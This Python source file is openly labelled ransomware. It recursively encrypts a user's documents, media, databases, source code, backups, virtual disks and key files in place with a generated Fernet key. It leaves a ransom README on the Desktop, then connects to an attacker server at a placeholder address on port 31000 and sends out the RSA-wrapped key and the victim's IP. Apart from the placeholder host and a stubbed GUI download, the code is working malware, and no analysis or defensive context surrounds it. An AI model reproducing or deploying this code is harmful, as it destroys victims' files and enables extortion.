import os
import requests
import socket
import threading
from pathlib import Path
from cryptography.fernet import Fernet
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

file_extension = ('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                  '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1',
                  '.pdf', '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc',
                  '.xltx', '.xltm', '.pptm', '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb', '.hwp', '.602', '.sxi',
                  '.sti', '.sldx', '.sldm', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z',
                  '.rar', '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif', '.tiff', '.nef', '.psd', '.ai', '.svg', '.djvu', '.m4u',
                  '.m3u', '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3',
                  '.sh', '.class', '.jar', '.java', '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip',
                  '.pl', '.vb', '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm',
                  '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd',
                  '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds',
                  '.uot', '.stw', '.sxw', '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der')

def download_gui():
    # Download GUI
    pass

class Ransomware:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.token = Fernet(self.key)
        self.desktop = os.path.expanduser('~/Desktop')
        
        self.main()

    def get_files(self) -> list:
        result = []
        for root, _, files in os.walk(str(Path.home())):
            for file in files:
                if file.endswith(file_extension):
                    result.append(os.path.join(root, file))
        return result

    def encrypt_files(self) -> None:
        for file in self.get_files():
            try:
                with open(file, 'rb+') as f:
                    plain_text = f.read()
                    cipher_text = self.token.encrypt(plain_text)
                    f.seek(0); f.truncate()
                    f.write(cipher_text)
            except:
                pass

    def notes(self) -> None:
        with open(os.path.join(self.desktop, 'README.txt'), 'w') as f:
            f.write(open('../data/msg.txt').read())

    def main(self) -> None:
        threading.Thread(target=self.encrypt_files).start()
        threading.Thread(target=self.notes).start()
        threading.Thread(target=self.connect_to_server).start()
        threading.Thread(target=download_gui).start() # download the gui after the encryption so it won't corrupt

    def connect_to_server(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.sock:
            self.sock.connect(('IP', 31000)) # change IP to your server's IP address
            self.send_key()
    
    def send_key(self):
        server_pub_key = RSA.importKey(self.sock.recv(1024))
        encryptor = PKCS1_OAEP.new(server_pub_key)
        cipher_key = encryptor.encrypt(self.key)
        self.sock.send(cipher_key)
        self.sock.send(f'{socket.gethostbyname(socket.gethostname())}'.encode())

if __name__ == '__main__':
    Ransomware()